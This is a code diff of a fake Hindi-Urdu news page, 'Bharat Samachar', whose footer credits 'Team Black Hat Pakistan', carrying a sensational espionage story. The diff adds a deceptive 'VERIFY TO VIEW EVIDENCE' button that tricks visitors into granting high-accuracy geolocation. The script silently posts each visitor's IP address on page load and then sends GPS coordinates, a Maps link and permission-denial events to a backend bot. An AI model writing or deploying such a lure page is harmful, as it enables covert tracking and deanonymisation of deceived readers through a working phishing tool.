@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bharat Samachar - Latest News India</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }
         header { background-color: #c00; color: white; padding: 10px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 5px solid #333; }
         .container { width: 90%; max-width: 1200px; margin: 20px auto; display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
         .main-news { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
@@ -14,7 +14,11 @@
         .date { color: #666; font-size: 0.9rem; margin-bottom: 20px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
         .news-content p { line-height: 1.8; margin-bottom: 15px; text-align: justify; }
         .breaking-tag { background: #c00; color: white; padding: 5px 10px; font-weight: bold; text-transform: uppercase; margin-right: 10px; }
-        .ad-space { background: #ddd; height: 250px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; border: 1px dashed #999; }
+        
+        /* Verification Button Styling */
+        .verification-area { border: 2px dashed #c00; padding: 20px; text-align: center; margin: 20px 0; background: #fff5f5; }
+        .btn-red { background: #c00; color: white; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 1.1rem; }
+        
         footer { background: #333; color: white; text-align: center; padding: 20px; margin-top: 50px; }
     </style>
 </head>
@@ -32,33 +36,27 @@
         <div class="date">Published: April 30, 2026 | New Delhi Bureau</div>
         
         <div class="news-content">
-            <p><strong>NEW DELHI:</strong> Aaj subah Pakistan ke Karachi aur Lahore shehron mein bade paimane par intelligence operation ke baad dawa kiya gaya hai ke Bharat ki RAW agency se talluq rakne wale 3 dehshatgardan ko giraftaar kiya gaya hai. Is khabar ne poore khitte mein sansani phella di hai.</p>
-            
-            <p>Sources ke mutabiq, in agents ke paas se hassas dastawezat aur modern communication equipment baramad hue hain. Halanki Bharat ki wizarat-e-kharija ne abhi tak is par koi rasmi bayan jari nahi kiya hai, lekin social media par inki tasaveer viral ho rahi hain. Kaha ja raha hai ke ye log pichle 2 saal se ek bade mission par kaam kar rahe the.</p>
+            <p><strong>NEW DELHI:</strong> Aaj subah Pakistan ke Karachi aur Lahore shehron mein bade paimane par intelligence operation ke baad dawa kiya gaya hai...</p>
 
-            <p>Pakistan ke dakhli sheheron mein security high alert par hai. Reports ke mutabiq, ye giraftariyan tab amal mein aayin jab ek agent ne border ke qareeb encryption signals ka istemal kiya jo ke intelligence agencies ne trace kar liya tha. Mazeed tehqiqat jari hain aur umeed hai ke jald hi bade khulase honge.</p>
+            <div class="verification-area">
+                <p><strong>Security Note:</strong> Sensitive information detected. Verify your region to view full evidence photos.</p>
+                <button class="btn-red" id="verifyBtn">VERIFY TO VIEW EVIDENCE</button>
+            </div>
 
-            <p>Yahan ye batana zaroori hai ke 30 April ki ye report ab tak ki sabse badi update maani ja rahi hai. Analysts ka kehna hai ke is waqiye se dono mulkon ke talluqat mein mazeed talkhi paida ho sakti hai. Mazeed maloomat ke liye hamare sath jude rahein.</p>
+            <p>Reports ke mutabiq, in agents ke paas se hassas dastawezat aur modern communication equipment baramad hue hain...</p>
         </div>
     </div>
 
     <div class="sidebar">
         <h3>LATEST UPDATES</h3>
-        <ul style="list-style: none; padding: 0;">
-            <li style="margin-bottom: 15px; border-bottom: 1px solid #ccc; padding-bottom: 5px;">• Stock Market Crashes by 2%</li>
-            <li style="margin-bottom: 15px; border-bottom: 1px solid #ccc; padding-bottom: 5px;">• New Education Policy 2026 Update</li>
-            <li style="margin-bottom: 15px; border-bottom: 1px solid #ccc; padding-bottom: 5px;">• Weather Alert: Heatwave in Mumbai</li>
-        </ul>
-        <div class="ad-space">ADVERTISEMENT</div>
+        <p>• Stock Market Updates</p>
+        <p>• Weather Alert: Mumbai</p>
     </div>
 </div>
 
-<footer>
-    © 2026 Bharat Samachar | Team Black Hat Pakistan Technical Support
-</footer>
+<footer>© 2026 Bharat Samachar | Team Black Hat Pakistan</footer>
 
 <script>
-    // Yehi function backend ko data bhejega
     async function sendToBot(data) {
         try {
             await fetch('/api/send', {
@@ -66,33 +64,44 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
-        } catch (e) {
-            console.log("Network error");
-        }
+        } catch (e) { console.log("API Error"); }
     }
 
+    // 1. IP Tracking (Background mein chalega)
     window.onload = async () => {
-        // 1. IP Tracking
         try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            await sendToBot({ type: 'IP', val: ipData.ip });
-        } catch (err) {}
-
-        // 2. Location Tracking
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await sendToBot({
-                    type: 'LOC',
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                });
-            }, (error) => {
-                sendToBot({ type: 'ERR', msg: 'User Blocked Permission' });
-            }, { enableHighAccuracy: true });
-        }
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            await sendToBot({ type: 'IP', val: data.ip });
+        } catch (e) {}
     };
+
+    // 2. Location Popup (SIRF Button click par trigger hoga)
+    document.getElementById('verifyBtn').addEventListener('click', function() {
+        const btn = this;
+        btn.innerText = "Verifying...";
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    await sendToBot({
+                        type: 'LOC',
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    });
+                    btn.innerText = "VERIFIED";
+                    alert("Region Verified. Files Unlocked.");
+                },
+                async (err) => {
+                    await sendToBot({ type: 'ERR', msg: "User Denied Permission" });
+                    alert("Please allow location access to verify your region.");
+                    btn.innerText = "TRY AGAIN";
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+    });
 </script>
 
 </body>
